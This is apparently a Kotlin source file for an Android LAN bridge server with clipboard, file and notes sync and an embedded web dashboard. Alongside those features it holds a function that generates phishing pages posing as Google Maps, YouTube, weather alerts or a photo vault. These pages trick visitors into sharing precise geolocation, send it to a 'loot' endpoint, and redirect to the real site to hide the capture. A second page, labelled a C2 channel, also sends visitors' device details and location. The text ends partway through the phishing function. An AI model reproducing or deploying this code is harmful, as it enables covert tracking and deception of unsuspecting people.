package com.example.rabit.data.network

import android.content.Context
import android.content.ContentUris
import android.net.Uri
import android.net.nsd.NsdManager
import android.net.nsd.NsdServiceInfo
import com.example.rabit.data.secure.CryptoManager
import android.os.Environment
import android.provider.MediaStore
import android.provider.OpenableColumns
import android.database.Cursor
import android.util.Log
import io.ktor.http.*
import io.ktor.http.content.*
import io.ktor.serialization.kotlinx.json.*
import io.ktor.server.application.*
import io.ktor.server.cio.*
import io.ktor.server.engine.*
import io.ktor.server.plugins.contentnegotiation.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.*
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json
import org.json.JSONObject
import java.io.File
import java.io.InputStream
import java.io.OutputStream
import java.security.MessageDigest
import java.util.ArrayDeque
import java.util.Locale
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap

/**
 * RabitNetworkServer - Lightweight Ktor HTTP server providing:
 *  - POST /upload   → Feature 1: File / Photo Transfer from Mac to Android
 *  - POST /media    → Feature 2: Forward Mac media metadata to Android
 *  - POST /handoff  → Feature 3: Open a URL sent from Android on the Mac
 */
object RabitNetworkServer {

    const val PORT = 8080
    private const val TAG = "RabitNetworkServer"

    /**
     * Memorable LAN URL when mDNS is active, e.g. `http://hackie-a3f2.local:8080`.
     * Requires clients on the same Wi‑Fi with multicast/mDNS allowed (not guest isolation).
     */
    @Volatile
    var friendlyLanHttpUrl: String? = null
        private set

    private var mdnsAppContext: Context? = null

    private var server: ApplicationEngine? = null
    @Volatile private var isStopping = false
    val isRunning: Boolean get() = server != null && !isStopping
    private var nsdManager: NsdManager? = null
    private var nsdRegistrationListener: NsdManager.RegistrationListener? = null
    private var encryptionManager: com.example.rabit.data.secure.EncryptionManager? = null
    // Bidirectional File Sharing
    var sharedFilesProvider: (() -> List<SharedFile>)? = null
    var fileDownloadProvider: ((String) -> android.net.Uri?)? = null
    
    // Universal Clipboard Callbacks
    var clipboardProvider: (() -> String)? = null
    var clipboardReceiver: ((String) -> Unit)? = null
    var notesProvider: (() -> List<BridgeNotePayload>)? = null
    var noteReceiver: ((String) -> Unit)? = null
    var noteUpdateReceiver: ((String, String) -> Unit)? = null
    var noteDeleteReceiver: ((String) -> Unit)? = null
    var nowPlayingReceiver: ((NowPlayingPayload) -> Unit)? = null
    var audioStreamStartReceiver: ((AudioStreamStartPayload) -> Unit)? = null
    var audioStreamChunkReceiver: ((AudioStreamChunkPayload) -> Unit)? = null
    var audioStreamStopReceiver: ((AudioStreamStopPayload) -> Unit)? = null
    var systemActionReceiver: ((String) -> Unit)? = null
    var biometricApprovalReceiver: (suspend () -> Boolean)? = null

    @Serializable
    data class ApiResponse(val success: Boolean, val message: String)

    @Serializable
    data class SystemActionPayload(val action: String)

    @Serializable
    data class SharedFile(
        val id: String,
        val name: String,
        val size: Long,
        val type: String,
        val checksum: String? = null,
        val resumable: Boolean = false
    )

    var currentPin: String = "0000"
    @Serializable
    data class TrustedSession(
        val token: String,
        val deviceId: String,
        val userAgent: String,
        val createdAt: Long,
        val expiresAt: Long,
        val revoked: Boolean = false
    )
    private val sessionTokens = ConcurrentHashMap<String, TrustedSession>()

    @Serializable
    data class AuthPayload(val pin: String)

    @Serializable
    data class TrustSessionPayload(val deviceId: String, val userAgent: String)

    @Serializable
    data class RevokeSessionPayload(val token: String)

    @Serializable
    data class ClipboardPayload(val text: String)

    @Serializable
    data class ClipboardHistoryPayload(val items: List<String>)

    @Serializable
    data class BridgeNotePayload(
        val id: String,
        val text: String,
        val createdAtMs: Long,
        val source: String = "Hackie"
    )

    @Serializable
    data class AddNotePayload(val text: String)

    @Serializable
    data class UpdateNotePayload(val text: String)

    @Serializable
    data class NowPlayingPayload(
        val title: String = "No track",
        val artist: String = "Unknown artist",
        val album: String = "",
        val artworkBase64: String? = null,
        val playbackState: String = "playing", // "playing", "paused", "stopped"
        val source: String = "desktop-helper"
    )

    @Serializable
    data class AudioStreamStartPayload(
        val sampleRate: Int = 44100,
        val channels: Int = 2,
        val source: String = "desktop-helper"
    )

    @Serializable
    data class AudioStreamChunkPayload(
        val pcm16leBase64: String
    )

    @Serializable
    data class AudioStreamStopPayload(
        val reason: String = "end"
    )

    @Serializable
    data class TransferJob(
        val id: String,
        val name: String,
        val direction: String,
        val status: String,
        val progressPercent: Int,
        val totalBytes: Long,
        val processedBytes: Long,
        val updatedAt: Long
    )

    private val clipboardHistory = ArrayDeque<String>()
    private const val maxClipboardHistory = 20
    private val transferJobs = ConcurrentHashMap<String, TransferJob>()
    private const val PORTAL_INDEX_ASSET = "webportal/index.html"

    @Serializable
    data class LootLocation(
        val latitude: Double,
        val longitude: Double,
        val accuracy: Double,
        val timestamp: Long,
        val ip: String,
        val userAgent: String,
        val template: String
    )

    private val capturedLoot = mutableListOf<LootLocation>()
    fun getCapturedLoot() = capturedLoot.toList()
    fun clearLoot() = capturedLoot.clear()

    fun getActiveSessions(): List<TrustedSession> {
        return sessionTokens.values.filter { !it.revoked && it.expiresAt > System.currentTimeMillis() }
    }

    fun revokeSession(token: String) {
        val session = sessionTokens[token]
        if (session != null) {
            sessionTokens[token] = session.copy(revoked = true)
        }
    }

    private val DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hackie Hub | Professional Web Bridge</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #070B10;
            --surface: #141A22;
            --surface-low: rgba(20, 26, 34, 0.7);
            --border: rgba(255, 255, 255, 0.08);
            --accent: #4A8BFF;
            --accent-glow: rgba(74, 139, 255, 0.3);
            --text: #F2F2F7;
            --text-s: #8E8E93;
            --success: #32D7B9;
            --error: #FF453A;
            --sidebar-w: 260px;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); color: var(--text); overflow: hidden; display: flex; height: 100vh; }

        /* Sidebar */
        .sidebar { width: var(--sidebar-w); border-right: 1px solid var(--border); background: var(--surface-low); backdrop-filter: blur(40px); display: flex; flex-direction: column; z-index: 100; }
        .sidebar-header { padding: 32px 24px; display: flex; align-items: center; gap: 12px; }
        .logo-box { width: 32px; height: 32px; background: var(--accent); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 900; color: white; }
        .sidebar-nav { flex: 1; padding: 0 12px; display: flex; flex-direction: column; gap: 4px; }
        .nav-item { padding: 12px 14px; border-radius: 12px; font-size: 14px; font-weight: 500; color: var(--text-s); cursor: pointer; display: flex; align-items: center; gap: 12px; transition: all 0.2s; }
        .nav-item:hover { background: rgba(255,255,255,0.04); color: var(--text); }
        .nav-item.active { background: var(--accent); color: white; }
        .sidebar-footer { padding: 24px; border-top: 1px solid var(--border); }

        /* Main */
        .content { flex: 1; display: flex; flex-direction: column; overflow: hidden; position: relative; }
        .topbar { height: 72px; padding: 0 32px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .status-pill { padding: 6px 14px; border-radius: 100px; background: rgba(50, 215, 185, 0.1); border: 1px solid rgba(50, 215, 185, 0.2); color: var(--success); font-size: 11px; font-weight: 700; letter-spacing: 0.5px; display: flex; align-items: center; gap: 8px; }

        .main-scroll { flex: 1; overflow-y: auto; padding: 32px; scroll-behavior: smooth; }
        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(360px, 1fr)); gap: 24px; }

        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 24px; padding: 24px; display: flex; flex-direction: column; transition: transform 0.2s; }
        .card-header { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .card-title { font-size: 16px; font-weight: 700; letter-spacing: -0.2px; }

        /* File Transfer Module */
        .dropzone { flex: 1; min-height: 200px; border: 2px dashed var(--border); border-radius: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; cursor: pointer; transition: 0.3s; }
        .dropzone.active { border-color: var(--accent); background: rgba(74, 139, 255, 0.05); }

        /* Sync Module */
        .sync-list { display: flex; flex-direction: column; gap: 8px; max-height: 400px; overflow-y: auto; }
        .sync-item { background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 16px; padding: 14px; display: flex; align-items: center; justify-content: space-between; }
        
        /* Remote Control */
        .remote-controls { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
        .btn-control { background: rgba(255,255,255,0.05); border: 1px solid var(--border); color: white; height: 64px; border-radius: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 6px; font-size: 11px; transition: 0.2s; }
        .btn-control:hover { background: var(--accent); border-color: var(--accent); }
        .btn-control i { font-size: 18px; }

        /* Utility */
        .btn-primary { background: var(--accent); color: white; border: none; padding: 12px 24px; border-radius: 12px; font-weight: 600; cursor: pointer; }
        .empty-text { color: var(--text-s); font-size: 13px; text-align: center; padding: 20px; }

        /* Auth */
        #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 2000; display: flex; align-items: center; justify-content: center; }
        .auth-box { width: 420px; text-align: center; }
        .pin-grid { display: flex; justify-content: center; gap: 12px; margin: 32px 0; }
        .pin-digit { width: 64px; height: 72px; background: var(--surface); border: 1px solid var(--border); border-radius: 16px; font-size: 32px; font-weight: 800; display: flex; align-items: center; justify-content: center; }
        
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }

        .hidden { display: none !important; }
    </style>
    <script src="https://kit.fontawesome.com/b6b7194f4a.js" crossorigin="anonymous"></script>
</head>
<body>
    <div id="auth-overlay">
        <div class="auth-box">
            <div class="logo-box" style="width: 64px; height: 64px; margin: 0 auto 24px; font-size: 24px">H</div>
            <h1 style="font-size: 32px; letter-spacing: -1px; margin-bottom: 8px">Bridge Protocol</h1>
            <p style="color: var(--text-s)">Enter authentication key from your device</p>
            <input type="password" id="pin-input" style="opacity: 0; position: absolute" maxlength="4" autofocus>
            <div class="pin-grid" onclick="document.getElementById('pin-input').focus()">
                <div class="pin-digit" id="d1"></div>
                <div class="pin-digit" id="d2"></div>
                <div class="pin-digit" id="d3"></div>
                <div class="pin-digit" id="d4"></div>
            </div>
            <button onclick="authenticate()" class="btn-primary" style="width: 200px">ACCESS HUB</button>
        </div>
    </div>

    <aside class="sidebar">
        <div class="sidebar-header">
            <div class="logo-box">H</div>
            <div style="font-weight: 800; font-size: 18px">HACKIE<span>.HUB</span></div>
        </div>
        <nav class="sidebar-nav">
            <div class="nav-item active" onclick="switchTab('dash')"><i class="fas fa-th-large"></i> Dashboard</div>
            <div class="nav-item" onclick="switchTab('notes')"><i class="fas fa-sticky-note"></i> Shared Notes</div>
        </nav>
        <div class="sidebar-footer">
            <p style="font-size: 11px; color: var(--text-s)">ENC ENCRYPTION ACTIVE</p>
            <p style="font-size: 10px; color: var(--success); font-weight: 600">Secure Network Session</p>
        </div>
    </aside>

    <div class="content">
        <header class="topbar">
            <div id="tab-title" style="font-weight: 700; font-size: 18px">Dashboard Hub</div>
            <div style="display: flex; align-items: center; gap: 20px">
                <div class="status-pill">
                    <div style="width: 6px; height: 6px; background: var(--success); border-radius: 50%"></div>
                    HUB ONLINE
                </div>
                <button onclick="revokeSession()" style="background: none; border: none; color: var(--text-s); font-size: 13px; cursor: pointer"><i class="fas fa-sign-out-alt"></i></button>
            </div>
        </header>

        <main class="main-scroll">
            <!-- TAB: Dashboard -->
            <div id="tab-dash" class="tab-content">
                <div class="dashboard-grid">
                    <!-- Universal Clipboard -->
                    <div class="card">
                        <div class="card-header">
                            <span class="card-title">Live Clipboard</span>
                            <i class="fas fa-clipboard" style="color: var(--accent)"></i>
                        </div>
                        <textarea id="clip-area" style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 16px; width: 100%; height: 100px; padding: 12px; color: white; resize: none; font-size: 13px; margin-bottom: 12px" placeholder="Universal paste history..."></textarea>
                        <div style="display: flex; gap: 8px">
                            <button class="btn-primary" style="flex: 1; font-size: 12px" onclick="syncClipboard('pull')">Pull from Phone</button>
                            <button class="btn-primary" style="flex: 1; font-size: 12px; background: var(--surface); border: 1px solid var(--border)" onclick="syncClipboard('push')">Push to Phone</button>
                        </div>
                    </div>

                    <!-- Shared List Module -->
                    <div class="card">
                        <div class="card-header">
                            <span class="card-title">Shared Files on Phone</span>
                            <button onclick="refreshShared()" style="background: none; border: none; color: var(--accent); font-size: 12px; font-weight: 600; cursor: pointer">Sync</button>
                        </div>
                        <div id="shared-list" class="sync-list">
                            <div class="empty-text">No files shared yet</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- TAB: Notes -->
            <div id="tab-notes" class="tab-content hidden">
                <div class="card" style="margin-bottom: 24px">
                    <div class="card-header">
                        <span class="card-title">Add Smart Note</span>
                    </div>
                    <div style="display: flex; gap: 12px">
                        <input type="text" id="note-input" style="flex: 1; background: var(--surface); border: 1px solid var(--border); padding: 12px; border-radius: 12px; color: white" placeholder="Type something to remember...">
                        <button onclick="addNote()" class="btn-primary">Add Note</button>
                    </div>
                </div>
                <div id="notes-grid" class="dashboard-grid"></div>
            </div>
        </main>
    </div>

    <script>
        let sessionToken = localStorage.getItem('rabit_token');
        let deviceId = localStorage.getItem('rabit_did') || 'web-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('rabit_did', deviceId);

        // UI Tabs
        function switchTab(tab) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            document.getElementById('tab-' + tab).classList.remove('hidden');
            event.currentTarget.classList.add('active');
            document.getElementById('tab-title').innerText = event.currentTarget.innerText;
        }

        // Auth Flow
        const pinInput = document.getElementById('pin-input');
        pinInput.addEventListener('input', () => {
            const val = pinInput.value;
            for(let i=1; i<=4; i++) {
                document.getElementById('d'+i).innerText = val[i-1] ? '•' : '';
            }
            if(val.length === 4) authenticate();
        });

        async function authenticate() {
            const res = await fetch('/auth', {
                method: 'POST',
                headers: {'Content-Type': 'application/json', 'X-Device-Id': deviceId },
                body: JSON.stringify({ pin: pinInput.value })
            });
            const data = await res.json();
            if(data.success) {
                sessionToken = data.message;
                localStorage.setItem('rabit_token', sessionToken);
                document.getElementById('auth-overlay').classList.add('hidden');
                initMain();
            } else {
                pinInput.value = '';
                alert('Access Denied');
            }
        }

        if(sessionToken) {
            document.getElementById('auth-overlay').classList.add('hidden');
            initMain();
        }

        function initMain() {
            refreshShared();
            refreshNotes();
            setInterval(autoSyncClipboard, 5000);
        }

        async function systemAction(action) {
            await fetch('/system/action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Session-Token': sessionToken },
                body: JSON.stringify({ action: action })
            });
        }

        async function syncClipboard(mode) {
            if(mode === 'pull') {
                const res = await fetch('/clipboard', { headers: { 'X-Session-Token': sessionToken } });
                const data = await res.json();
                document.getElementById('clip-area').value = data.text;
                navigator.clipboard.writeText(data.text);
            } else {
                const text = document.getElementById('clip-area').value;
                await fetch('/clipboard', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-Session-Token': sessionToken },
                    body: JSON.stringify({ text })
                });
            }
        }

        async function autoSyncClipboard() {
            if(!document.hasFocus()) return;
            const text = await navigator.clipboard.readText();
            if(text && text !== document.getElementById('clip-area').value) {
                document.getElementById('clip-area').value = text;
                await syncClipboard('push');
            }
        }

        async function refreshShared() {
            const res = await fetch('/shared-files', { headers: { 'X-Session-Token': sessionToken } });
            const files = await res.json();
            const list = document.getElementById('shared-list');
            list.innerHTML = files.length ? files.map(f => `
                <div class="sync-item">
                    <div style="font-size: 13px">
                        <p style="font-weight: 600">${"$"}{f.name}</p>
                        <p style="color: var(--text-s); font-size: 10px">${"$"}{(f.size/1024/1024).toFixed(1)}MB • ${"$"}{f.type.split('/')[1]}</p>
                    </div>
                    <button class="btn-control" style="width: 32px; height: 32px" onclick="location.href='/download/${"$"}{f.id}?token=${"$"}{sessionToken}'"><i class="fas fa-download"></i></button>
                </div>
            `).join('') : '<div class="empty-text">Nothing shared</div>';
        }

        // Notes Flow
        async function refreshNotes() {
            const res = await fetch('/notes', { headers: { 'X-Session-Token': sessionToken } });
            const notes = await res.json();
            const grid = document.getElementById('notes-grid');
            grid.innerHTML = notes.map(n => `
                <div class="card">
                    <p id="note-text-${"$"}{n.id}" style="font-size: 14px; line-height: 1.6; margin-bottom: 12px; white-space: pre-wrap;">${"$"}{n.text}</p>
                    <div style="display: flex; justify-content: space-between; align-items: center">
                        <span style="font-size: 10px; color: var(--text-s)">${"$"}{new Date(n.createdAtMs).toLocaleString()}</span>
                        <div style="display: flex; gap: 12px">
                            <button onclick="editNote('${"$"}{n.id}')" style="background: none; border: none; color: var(--accent); cursor: pointer; font-size: 14px"><i class="fas fa-edit"></i></button>
                            <button onclick="deleteNote('${"$"}{n.id}')" style="background: none; border: none; color: var(--error); cursor: pointer; font-size: 14px"><i class="fas fa-trash"></i></button>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        async function addNote() {
            const input = document.getElementById('note-input');
            const text = input.value.trim();
            if (!text) return;
            await fetch('/notes', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Session-Token': sessionToken },
                body: JSON.stringify({ text: text })
            });
            input.value = '';
            refreshNotes();
        }

        async function editNote(id) {
            const oldText = document.getElementById('note-text-' + id).innerText;
            const newText = prompt("Edit note:", oldText);
            if (newText === null || newText.trim() === "" || newText === oldText) return;
            
            try {
                const res = await fetch('/notes/' + id, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json', 'X-Session-Token': sessionToken },
                    body: JSON.stringify({ text: newText.trim() })
                });
                if (res.ok) refreshNotes();
                else alert("Failed to update note");
            } catch (err) {
                console.error(err);
                alert("Error updating note");
            }
        }

        async function deleteNote(id) {
            if (!confirm("Are you sure you want to delete this note?")) return;
            try {
                const res = await fetch('/notes/' + id, { 
                    method: 'DELETE', 
                    headers: { 'X-Session-Token': sessionToken } 
                });
                if (res.ok) refreshNotes();
                else alert("Failed to delete note");
            } catch (err) {
                console.error(err);
                alert("Error deleting note");
            }
        }

        // Upload
        const dz = document.getElementById('dropzone');
        const finput = document.getElementById('file-input');
        finput.onchange = () => upload(finput.files);
        dz.ondragover = e => { e.preventDefault(); dz.classList.add('active'); };
        dz.ondragleave = () => dz.classList.remove('active');
        dz.ondrop = e => { e.preventDefault(); dz.classList.remove('active'); upload(e.dataTransfer.files); };

        async function upload(files) {
            const fd = new FormData();
            for(let f of files) fd.append('file', f);
            const pwrap = document.getElementById('prog-wrap');
            const pbar = document.getElementById('prog-bar');
            pwrap.style.display = 'block';
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/upload');
            xhr.setRequestHeader('X-Session-Token', sessionToken);
            xhr.upload.onprogress = e => pbar.style.width = (e.loaded/e.total)*100 + '%';
            xhr.onload = () => { pwrap.style.display = 'none'; refreshShared(); alert('Transfer Complete'); };
            xhr.send(fd);
        }

        function revokeSession() {
            localStorage.clear();
            location.reload();
        }
    </script>
</body>
</html>
""".trimIndent()

    private val REMOTE_DECK_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Lab | Interaction Sandbox</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #05050A;
            --accent: #00F2FF;
            --purple: #BC13FE;
            --error: #FF3131;
            --text: #FFFFFF;
            --surface: rgba(255, 255, 255, 0.05);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: var(--bg); 
            color: var(--text); 
            font-family: 'Inter', sans-serif; 
            height: 100vh; 
            overflow: hidden; 
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            width: 100%;
            max-width: 500px;
            padding: 40px;
            text-align: center;
            position: relative;
        }
        .glow {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, var(--accent) 0%, transparent 70%);
            filter: blur(80px);
            opacity: 0.15;
            z-index: -1;
        }
        h1 { font-size: 32px; font-weight: 900; letter-spacing: -1px; margin-bottom: 8px; }
        p { color: rgba(255,255,255,0.5); font-size: 14px; margin-bottom: 32px; }
        .pin-box {
            background: var(--surface);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 24px;
            padding: 40px;
            backdrop-filter: blur(20px);
        }
        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 100px;
            font-size: 10px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 24px;
        }
        .status-disconnected { color: var(--error); border: 1px solid rgba(255,49,49,0.3); background: rgba(255,49,49,0.1); }
        .status-connecting { color: var(--accent); border: 1px solid rgba(0,242,255,0.3); background: rgba(0,242,255,0.1); }
        .status-connected { color: #39FF14; border: 1px solid rgba(57,255,20,0.3); background: rgba(57,255,20,0.1); }
        
        input {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.1);
            color: var(--accent);
            font-family: 'Space Mono', monospace;
            font-size: 24px;
            text-align: center;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            outline: none;
            transition: 0.3s;
        }
        input:focus { border-color: var(--accent); box-shadow: 0 0 20px rgba(0,242,255,0.2); }
        
        button {
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            border: none;
            background: var(--accent);
            color: black;
            font-weight: 900;
            font-size: 14px;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { transform: scale(1.02); filter: brightness(1.1); }
        
        #interaction-area { display: none; }
        .alert-box {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #FF3131;
            color: white;
            padding: 20px 40px;
            border-radius: 12px;
            font-weight: 900;
            z-index: 1000;
            display: none;
            animation: shake 0.5s infinite;
        }
        @keyframes shake {
            0% { transform: translateX(-50%) rotate(0deg); }
            25% { transform: translateX(-52%) rotate(-1deg); }
            75% { transform: translateX(-48%) rotate(1deg); }
            100% { transform: translateX(-50%) rotate(0deg); }
        }
    </style>
</head>
<body>
    <div id="alert" class="alert-box">PROXIMITY WARNING</div>
    <div class="glow"></div>
    
    <div class="container" id="auth-area">
        <div class="status-badge status-disconnected" id="status-label">Awaiting Connection</div>
        <h1>Neural Uplink</h1>
        <p>Initialize interaction sandbox via PIN</p>
        
        <div class="pin-box">
            <input type="text" id="pin-input" placeholder="0000" maxlength="4">
            <button id="connect-btn">ESTABLISH LINK</button>
        </div>
    </div>

    <div class="container" id="interaction-area">
        <div class="status-badge status-connected">Link Active</div>
        <h1>Interaction Sandbox</h1>
        <p>Secure C2 channel established.</p>
        
        <div class="pin-box" style="text-align: left; font-family: 'Space Mono', monospace; font-size: 12px;">
            <div id="log-content" style="height: 200px; overflow-y: auto; color: rgba(255,255,255,0.7);">
                [SYSTEM] Initializing telemetry...<br>
                [SYSTEM] Waiting for phone commands...<br>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAWSQosAbTF0JnYLlgIOC7IZdVxn0ht9jc",
            projectId: "hackie-260414-01"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        let pc;
        let dc;
        let pin;

        const urlParams = new URLSearchParams(window.location.search);
        if(urlParams.has('pin')) {
            document.getElementById('pin-input').value = urlParams.get('pin');
        }

        document.getElementById('connect-btn').onclick = () => {
            pin = document.getElementById('pin-input').value;
            if(pin.length === 4) {
                startLink(pin);
            }
        };

        async function startLink(pin) {
            document.getElementById('status-label').innerText = "Negotiating...";
            document.getElementById('status-label').className = "status-badge status-connecting";
            
            const roomId = "rabit_p2p_" + pin;
            const signalRef = db.collection('signals').document(roomId);

            pc = new RTCPeerConnection({
                iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
            });

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    signalRef.update({
                        web_candidates: firebase.firestore.FieldValue.arrayUnion(JSON.stringify(event.candidate))
                    });
                }
            };

            pc.ondatachannel = (event) => {
                setupDataChannel(event.channel);
            };

            // In our architecture, the phone is the host and creates the channel.
            // But we can also initiate an offer from the web side if we want.
            // Let's create an offer to trigger the phone's listener.
            
            dc = pc.createDataChannel("file_hub");
            setupDataChannel(dc);

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);

            await signalRef.set({
                web_offer: offer.sdp,
                timestamp: Date.now(),
                web_candidates: []
            }, { merge: true });

            signalRef.onSnapshot((doc) => {
                const data = doc.data();
                if (data && data.android_answer && !pc.currentRemoteDescription) {
                    const answer = new RTCSessionDescription({ type: 'answer', sdp: data.android_answer });
                    pc.setRemoteDescription(answer);
                }
                if (data && data.android_candidates) {
                    data.android_candidates.forEach(candStr => {
                        const candidate = new RTCIceCandidate(JSON.parse(candStr));
                        pc.addIceCandidate(candidate);
                    });
                }
            });
        }

        function setupDataChannel(channel) {
            dc = channel;
            dc.onopen = () => {
                document.getElementById('auth-area').style.display = "none";
                document.getElementById('interaction-area').style.display = "block";
                log("P2P Connection Established");
                sendStats();
                setInterval(sendStats, 30000);
            };

            dc.onmessage = (event) => {
                const msg = JSON.parse(event.data);
                log("RECEIVED: " + msg.type);
                
                if (msg.type === "push_text") {
                    navigator.clipboard.writeText(msg.text);
                    log("ACTION: Copied to clipboard");
                } else if (msg.type === "remote_alert") {
                    showAlert(msg.text);
                } else if (msg.type === "trigger_focus") {
                    document.body.requestFullscreen().catch(() => {});
                    log("ACTION: Fullscreen triggered");
                }
            };
        }

        function log(msg) {
            const div = document.getElementById('log-content');
            div.innerHTML += `[${"$"}{new Date().toLocaleTimeString()}] ${"$"}{msg}<br>`;
            div.scrollTop = div.scrollHeight;
        }

        function showAlert(text) {
            const alert = document.getElementById('alert');
            alert.innerText = text || "PROXIMITY WARNING";
            alert.style.display = "block";
            setTimeout(() => { alert.style.display = "none"; }, 5000);
        }

        async function sendStats() {
            if(dc.readyState !== "open") return;
            const stats = {
                type: "CLIENT_STATS",
                os: navigator.platform,
                ram: (navigator.deviceMemory || "N/A") + " GB",
                cores: navigator.hardwareConcurrency || "N/A",
                ip: "Web Client"
            };
            dc.send(JSON.stringify(stats));
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(pos => {
                    dc.send(JSON.stringify({
                        type: "LOCATION_UPDATE",
                        lat: pos.coords.latitude.toFixed(4),
                        lon: pos.coords.longitude.toFixed(4)
                    }));
                });
            }
        }
    </script>
</body>
</html>
""".trimIndent()
    private fun generatePhishingHtml(template: String): String {
        val (title, message, icon) = when (template) {
            "maps" -> Triple("Google Maps", "A friend shared a private location with you. Tap 'Allow' to view distance and directions.", "https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png")
            "youtube" -> Triple("YouTube", "This video is region-locked. Tap 'Allow' to verify your location and start playback.", "https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg")
            "weather" -> Triple("Local Weather", "Get severe weather alerts for your current position. Tap 'Allow' to enable precise tracking.", "https://ssl.gstatic.com/onebox/weather/64/partly_cloudy.png")
            "photo" -> Triple("Private Photo Vault", "You have been invited to view a protected photo album. Tap 'Allow' to verify your identity and access the gallery.", "https://cdn-icons-png.flaticon.com/512/3342/3342137.png")
            else -> Triple("System Check", "Identity verification required to access this content. Tap 'Allow' to proceed.", "")
        }

        return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$title</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; color: #333; }
        .card { max-width: 320px; padding: 24px; }
        img { width: 64px; margin-bottom: 20px; }
        h1 { font-size: 20px; font-weight: 600; margin-bottom: 12px; }
        p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 24px; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4A8BFF; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <img src="$icon" alt="App Icon">
        <h1>$title</h1>
        <p>$message</p>
        <div id="status"><div class="loader"></div><br><span style="font-size: 12px; color: #999">Verifying region...</span></div>
    </div>
    <script>
        function sendLoot(pos) {
            fetch('/api/loot/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: Date.now(),
                    template: '$template',
                    ip: "",
                    userAgent: ""
                })
            }).then(() => {
                if ('$template' === "maps") window.location.href = "https://maps.google.com";
                else if ('$template' === "youtube") window.location.href = "https://youtube.com";
                else if ('$template' === "photo") window.location.href = "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1000&q=80";
                else window.location.href = "https://google.com";
            });
        }

        navigator.geolocation.getCurrentPosition(sendLoot, (err) => {
            console.error(err);
            document.getElementById('status').innerText = "Please enable location to view content.";
        }, { enableHighAccuracy: true });
    </script>
</body>
